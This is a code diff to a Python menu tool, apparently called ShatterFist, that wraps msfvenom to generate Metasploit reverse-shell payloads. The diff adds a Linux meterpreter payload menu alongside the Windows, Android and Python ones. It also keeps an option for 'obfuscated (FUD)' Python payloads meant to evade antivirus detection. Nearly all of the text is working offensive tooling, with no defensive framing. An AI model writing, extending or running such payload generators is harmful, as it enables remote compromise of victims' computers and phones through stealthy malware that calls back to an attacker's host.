@@ -53,6 +53,7 @@ lport = "4962"
 pyoutfile = "pythonpayload.py"
 winoutfile = "windowspayload.exe"
 androutfile = "androidpayload.apk"
+linuxoutfile = "linuxpayload.bin"
 defaultarch = "x86"
 talkbackm1 = "tcp"
 
@@ -89,7 +90,7 @@ def lask():
         lport = str(lportask)    
     print(colorama.Style.RESET_ALL)
 
-def payloadgen1(payload, talkback, lhost, lport, outfile):
+def payloadgen1(payload, talkback, lhost, lport, outfile): #Not used as of now
     subprocess.run(["msfvenom", "-p", payload + "/meterpreter/reverse_" + talkback, "LHOST=" + lhost, "LPORT=" + str(lport), "-o", outfile])    
 
 def payloadgen2(payloadandsession, lhost, lport, outfile, args1, args2):
@@ -101,6 +102,16 @@ def payloadgen2(payloadandsession, lhost, lport, outfile, args1, args2):
         print(colorama.Fore.LIGHTGREEN_EX + f"#====================#\nDone! \nSaved as {outfile}\n(If no errors were encountered that is)\n#====================#\n\n" + colorama.Style.RESET_ALL)  
     finally:
         input(colorama.Fore.LIGHTBLUE_EX + "Press any key to continue" + colorama.Style.RESET_ALL)    
+
+def payloadgen3(payload, outfile, args1, args2):
+    global lhost, lport
+    clearscreen()    
+    lask()
+    outfile = inputc(f"Enter file to save payload as. Leave empty for default {colorama.Fore.LIGHTRED_EX}({outfile}){colorama.Fore.BLUE}: ")
+    asktb()
+    print(f"{colorama.Fore.LIGHTCYAN_EX}Generating {payload} Payload...{colorama.Style.RESET_ALL}")  
+    payloadgen2(payload, lhost, lport, outfile, args1, args2)
+
 def asktb():
     global n, talkbackm1 
     n = 1 
@@ -123,11 +134,8 @@ def pythonpayload():
     n = 1
     clearscreen()
     printbannred("Python Payload Menu")
-    time.sleep(0.2)
     printopt("Create a simple python meterpreter payload")
-    time.sleep(0.1)
     printopt("Create an obfistucated (FUD) python meterpreter payload")
-    time.sleep(0.1)
     inputpy = inputc("Option: ").strip()
     lask()
     inputpy2 = inputc(f"Enter file to save payload as. Leave empty for default {colorama.Fore.LIGHTRED_EX}({pyoutfile}){colorama.Fore.BLUE}: ")
@@ -138,13 +146,14 @@ def pythonpayload():
     if inputpy == "1":
         print(colorama.Fore.LIGHTCYAN_EX + "Generating payload...")
         #payloadgen1("python", talkbackm1, lhost, lport, pyoutfile)
-        payloadgen2(f"python/meterpreter/reverse_{talkbackm1}", lhost, lport, pyoutfile, '', '')
+        payloadgen2(f"python/meterpreter/reverse_{talkbackm1}", lhost, lport, pyoutfile, None, None)
         time.sleep(2)
         menu()
     #PYFUD starts here     
     elif inputpy == "2": 
         print(colorama.Fore.LIGHTCYAN_EX + "Generating payload...")
-        payloadgen1("python", talkbackm1, lhost, lport, pyoutfile + ".tmp")    
+        #payloadgen1("python", talkbackm1, lhost, lport, pyoutfile + ".tmp")    
+        payloadgen2(f"python/meterpreter/reverse_{talkbackm1}", lhost, lport, pyoutfile + ".tmp", None, None)
         pythonpayloadfud()
 
 def pythonpayloadfud():
@@ -197,7 +206,7 @@ def winpayload():
         payloadgen2("windows/meterpreter/reverse_tcp", lhost, lport, winoutfile,f'-a {defaultarch}','-b "\\x00" -f exe')
         menu()
     #WinShell    
-    if inputwin == "2":
+    elif inputwin == "2":
         print(colorama.Fore.LIGHTCYAN_EX + "Generating payload...")
         payloadgen2("windows/shell/reverse_tcp", lhost, lport, winoutfile,f'-a {defaultarch}','-b "\\x00" -f exe')
 
@@ -211,10 +220,13 @@ def androidpayload():
     n = 1
     clearscreen()
     printbannred("Android Payload Menu")
-    printopt("Create a simple android payload")
+    printopt("Create a simple Meterpreter payload")
     inputy = inputc("Option: ").strip()
     lask()
+    inputy2 = inputc(f"Enter file to save payload as. Leave empty for default {colorama.Fore.LIGHTRED_EX}({winoutfile}){colorama.Fore.BLUE}: ")
     asktb()
+    if inputy2.strip() != "":
+        androutfile = inputy2
     if inputy == "1": 
         print(colorama.Fore.LIGHTCYAN_EX + "Generating payload...")
         payloadgen2(f"android/meterpreter/reverse_{talkbackm1}", lhost, lport, androutfile, '', '')
@@ -226,19 +238,45 @@ def androidpayload():
         androidpayload()   
 def miscmenu():
     print(colorama.Fore.LIGHTRED_EX + "NOT READY YET!!!" + colorama.Style.RESET_ALL)
+    n = 1 
+    printopt("")
     time.sleep(2)
     menu()    
+
+def linuxpayloadmenu():
+    global  n, linuxoutfile, lhost, lport, talkbackm1
+    n = 1
+    clearscreen()
+    printbannred("Linux Payload Menu")
+    printopt("Create a simple Linux Meterpreter tcp payload")
+    inputy = inputc("Option: ").strip()
+    lask()
+    inputy2 = inputc(f"Enter file to save payload as. Leave empty for default {colorama.Fore.LIGHTRED_EX}({linuxoutfile}){colorama.Fore.BLUE}: ")
+    asktb()
+    if inputy2.strip() != "":
+        linuxoutfile = inputy2
+
+    if inputy == "1": 
+        print(colorama.Fore.LIGHTCYAN_EX + "Generating payload...")
+        payloadgen2(f"linux/x86/meterpreter/reverse_{talkbackm1}", lhost, lport, linuxoutfile, '', '')
+        menu()
+    else:
+        print(colorama.Fore.LIGHTRED_EX + f"ERR: Option {inputy} is not valid" + colorama.Style.RESET_ALL) 
+        time.sleep(2)
+        linuxpayloadmenu()   
 
 def menu():
     global n 
     n = 1
     clearscreen()
     print(colorama.Fore.LIGHTRED_EX + colorama.Style.BRIGHT + banner3 +  colorama.Style.RESET_ALL)
+    print("Dev:" + colorama.Style.BRIGHT + "SlickPunk (slick-punk)" + colorama.Style.RESET_ALL)
     print(colorama.Style.BRIGHT + "BETA" + colorama.Style.RESET_ALL)
     print("\n")
     printopt("Python payload menu")
     printopt("Windows payload menu")
     printopt("Android payload menu")
+    printopt("Linux payload menu")
     #printopt("Miscellaneous payloads")
     printopt2("M", "Start the Metasploit Framework Console")
     printopt2("E", "Exit ShatterFist")
@@ -253,7 +291,10 @@ def menu():
     elif input1 == "3":
         androidpayload() 
     elif input1 == "4":
+        linuxpayloadmenu()
+    elif input1 == "5":
         miscmenu()
+
     elif input1 == "m" or input1 == "msfconsole":
         clearscreen()
         print(colorama.Fore.LIGHTRED_EX)
@@ -266,7 +307,7 @@ def menu():
         for letter in bye:
             print(letter,end="", flush=True)
             time.sleep(0.05)
-        print("")
+        print()
         time.sleep(0.1)
         sys.exit()
 
